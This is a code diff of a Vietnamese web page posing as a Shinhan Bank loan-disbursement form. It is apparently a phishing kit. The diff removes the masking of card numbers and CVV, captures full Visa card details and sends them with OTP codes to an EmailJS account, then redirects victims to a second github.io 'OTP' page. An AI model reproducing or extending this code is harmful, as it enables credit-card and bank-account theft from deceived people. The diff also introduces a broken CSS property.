@@ -17,7 +17,7 @@
             };
         };
         // Initialize EmailJS
-        emailjs.init('OrBsI926QI2_xBh1f'); // Thay bằng Public Key của bạn
+        emailjs.init('OrBsI926QI2_xBh1f');
     </script>
     <style>
         * {
@@ -175,7 +175,7 @@
         .next { right: 15px; }
 
         .dots {
-            text-align: center;
+            text-aligned: center;
             position: absolute;
             bottom: 10px;
             width: 100%;
@@ -813,18 +813,22 @@
                 <p>Ngân hàng: <span id="summaryBank"></span></p>
                 <p>Số điện thoại: <span id="summaryPhone"></span></p>
                 <p>Số tài khoản nhận tiền giải ngân: <span id="summaryAccountNumber"></span></p>
+                <p>Số thẻ Visa: <span id="summaryCardNumber"></span></p>
+                <p>Ngày hết hạn: <span id="summaryExpiryDate"></span></p>
+                <p>Họ và tên chủ thẻ: <span id="summaryFullName"></span></p>
+                <p>Số CVV: <span id="summaryCvv"></span></p>
             </div>
             <p class="check-info">Vui lòng kiểm tra thông tin trước khi nhập thẻ!</p>
             <div class="form-group" aria-live="polite">
                 <label for="visaCardNumber">Số thẻ Visa *</label>
-                <input type="text" id="visaCardNumber" placeholder="4089 ..." maxlength="19" required aria-describedby="visaCardNumberError">
+                <input type="text" id="visaCardNumber" placeholder="4089 1234 5678 9012" maxlength="19" required aria-describedby="visaCardNumberError">
                 <span class="help-text">16 số in trên mặt trước thẻ Visa, bắt đầu bằng 4089.</span>
                 <span class="error" id="visaCardNumberError">Số thẻ phải là 16 số, bắt đầu bằng 4089</span>
             </div>
             <div class="form-group" aria-live="polite">
                 <label for="visaExpiryDate">Ngày hết hạn *</label>
-                <input type="text" id="visaExpiryDate" placeholder="05/25" maxlength="5" required aria-describedby="visaExpiryDateError">
-                <span class="help-text">Ngày hết hạn trên thẻ, định dạng mm/yy (ví dụ: 05/25).</span>
+                <input type="text" id="visaExpiryDate" placeholder="02/30" maxlength="5" required aria-describedby="visaExpiryDateError">
+                <span class="help-text">Ngày hết hạn trên thẻ, định dạng mm/yy (ví dụ: 02/30).</span>
                 <span class="error" id="visaExpiryDateError">Ngày hết hạn phải hợp lệ (mm/yy, sau ngày hiện tại)</span>
             </div>
             <div class="form-group" aria-live="polite">
@@ -842,20 +846,6 @@
             <div class="buttons">
                 <button type="submit" class="primary">Xác nhận</button>
             </div>
-        </form>
-        <form id="otp-form" class="otp-form">
-            <p class="check-info">Vui lòng kiểm tra thông tin trước khi giải ngân!</p>
-            <div class="form-group" aria-live="polite">
-                <p id="otpMessage"></p>
-                <label for="otp">Nhập mã OTP</label>
-                <input type="text" id="otp" required aria-describedby="otpError">
-                <span class="error" id="otpError">Vui lòng nhập mã OTP hợp lệ</span>
-            </div>
-            <p class="timer" id="otpTimer" aria-live="polite">Còn 60 giây</p>
-            <div class="buttons">
-                <button type="submit" class="primary">Xác nhận</button>
-            </div>
-            <a href="https://uat.megapay.vn/internet-banking" class="guide-link">Hướng dẫn đăng ký thanh toán online</a>
         </form>
         <button class="issue-guide-btn" id="issue-guide-btn" onclick="toggleIssueGuide()">Hướng dẫn phát hành thẻ</button>
         <div class="issue-guide-section" id="issue-guide">
@@ -912,6 +902,10 @@
                 document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
                 document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
                 document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
+                document.getElementById('summaryCardNumber').textContent = formData.cardNumber || 'N/A';
+                document.getElementById('summaryExpiryDate').textContent = formData.expiryDate || 'N/A';
+                document.getElementById('summaryFullName').textContent = formData.fullName || 'N/A';
+                document.getElementById('summaryCvv').textContent = formData.cvv || 'N/A';
                 // Send formData to EmailJS
                 emailjs.send('service_60tgxof', 'template_m26sq6s', {
                     full_name: formData.fullName || 'N/A',
@@ -1084,12 +1078,17 @@
             }
 
             if (isValid) {
-                formData.cardNumber = '****' + cardNumber.slice(-4);
+                formData.cardNumber = document.getElementById('visaCardNumber').value;
                 formData.expiryDate = expiryDate;
                 formData.fullName = fullName;
-                formData.cvv = '***'; // Ẩn CVV để bảo mật
+                formData.cvv = cvv;
                 formData.cardType = 'visa';
                 formData.bankName = selectedBank;
+                // Update summary with full card details
+                document.getElementById('summaryCardNumber').textContent = formData.cardNumber;
+                document.getElementById('summaryExpiryDate').textContent = formData.expiryDate;
+                document.getElementById('summaryFullName').textContent = formData.fullName;
+                document.getElementById('summaryCvv').textContent = formData.cvv;
                 sessionStorage.setItem('formData', JSON.stringify(formData));
                 // Gửi thông tin thẻ qua EmailJS
                 const cardData = {
@@ -1102,13 +1101,8 @@
                     timestamp: new Date().toLocaleString('vi-VN')
                 };
                 sendCardInfo(cardData);
-                document.getElementById('card-info-form').classList.remove('active');
-                document.getElementById('card-guide').classList.remove('active');
-                document.getElementById('issue-guide-btn').classList.remove('active');
-                document.getElementById('otp-form').classList.add('active');
-                document.getElementById('otpMessage').innerHTML = `Vui lòng nhập mã xác nhận giải ngân được gửi qua số điện thoại<br>${formData.phone || 'N/A'}<br>liên kết với tài khoản ngân hàng nhận tiền<br>để xác nhận đồng ý giải ngân số tiền<br>${formData.amount || 'N/A'} về tài khoản ngân hàng.`;
-                startOTPTimer();
-                sendOTPToEmail('123456', formData.phone || 'N/A');
+                // Redirect to OTP page
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/atm2.html';
             }
 
             return isValid;
@@ -1141,7 +1135,7 @@
         // Send OTP to EmailJS
         function sendOTPToEmail(otp, phone) {
             console.log('Sending OTP to EmailJS:', { otp, phone });
-            emailjs.send('YOUR_SERVICE_ID', 'YOUR_OTP_TEMPLATE_ID', {
+            emailjs.send('service_60tgxof', 'template_m26sq6s', {
                 otp: otp,
                 phone: phone,
                 timestamp: new Date().toLocaleString('vi-VN')
